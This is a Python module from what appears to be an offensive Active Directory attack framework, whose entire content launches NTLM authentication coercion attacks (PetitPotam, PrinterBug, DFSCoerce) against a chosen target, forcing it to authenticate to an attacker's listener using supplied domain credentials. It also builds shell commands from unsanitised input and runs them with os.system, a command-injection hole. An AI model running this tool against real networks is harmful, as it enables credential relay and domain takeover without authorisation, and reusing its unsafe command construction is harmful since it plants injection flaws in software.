# modules/attack/coerce.py

import os
from core.colors import blue, green, red, yellow
from core.helpers import run_command

COERCE_METHODS = {
    "petitpotam": "python3 tools/PetitPotam.py {listener} {target}",
    "printerbug": "python3 tools/printerbug.py {domain}/{username}:'{password}'@{target} {listener}",
    "dfscoerce":  "python3 tools/dfscoerce.py -u {username} -p '{password}' -d {domain} {listener} {target}",
}


def attack_coerce(session, *args):
    method = args[0].lower() if args else None

    if not method or method not in COERCE_METHODS:
        print(blue(f"[*] Available coercion methods: {', '.join(COERCE_METHODS.keys())}"))
        method = input("[?] Choose method: ").strip().lower()

    if method not in COERCE_METHODS:
        print(red(f"[-] Unknown coercion method: {method}"))
        return

    target = args[1] if len(args) > 1 else input("[?] Target IP or hostname: ").strip()
    listener = args[2] if len(args) > 2 else input("[?] Listener IP (your machine): ").strip()

    password = session.password or ''
    cmd = COERCE_METHODS[method].format(
        listener=listener,
        target=target,
        domain=session.domain,
        username=session.username,
        password=password,
    )

    print(blue(f"[*] Running: {cmd}"))
    try:
        os.system(cmd)
    except Exception as e:
        print(red(f"[!] Coercion failed: {e}"))
